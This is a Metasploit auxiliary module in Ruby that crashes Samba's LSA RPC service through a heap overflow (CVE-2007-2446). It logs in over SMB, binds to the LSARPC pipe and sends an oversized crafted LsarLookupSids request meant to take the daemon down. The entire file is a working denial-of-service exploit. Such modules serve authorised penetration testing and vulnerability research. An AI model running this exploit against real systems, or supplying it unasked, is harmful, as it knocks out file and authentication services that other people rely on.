##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Samba lsa_io_trans_names Heap Overflow',
        'Description' => %q{
          This module triggers a heap overflow in the LSA RPC service
          of the Samba daemon.
        },
        'Author' => [ 'hdm' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2007-2446'],
          ['OSVDB', '34699'],
        ],
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('SMBPIPE', [ true, 'The pipe name to use', 'LSARPC']),
      ]
    )
  end

  def run
    pipe = datastore['SMBPIPE'].downcase

    print_status('Connecting to the SMB service...')
    connect
    smb_login

    datastore['DCERPC::fake_bind_multi'] = false

    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{pipe}"])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    stub = lsa_open_policy(dcerpc)
    stub << NDR.long(0)
    stub << NDR.long(0)
    stub << NDR.long(1)
    stub << NDR.long(0x20004)
    stub << NDR.long(0x100)
    stub << ('X' * 16) * 0x100
    stub << NDR.long(1)
    stub << NDR.long(0)

    print_status('Calling the vulnerable function...')

    begin
      # LsarLookupSids
      dcerpc.call(0x0f, stub)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse, ::EOFError
      print_good('Server did not respond, this is expected')
    rescue StandardError => e
      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
        print_good('Server disconnected, this is expected')
      else
        raise e
      end
    end

    dcerpc.call(0x0f, stub)

    disconnect
  end
end
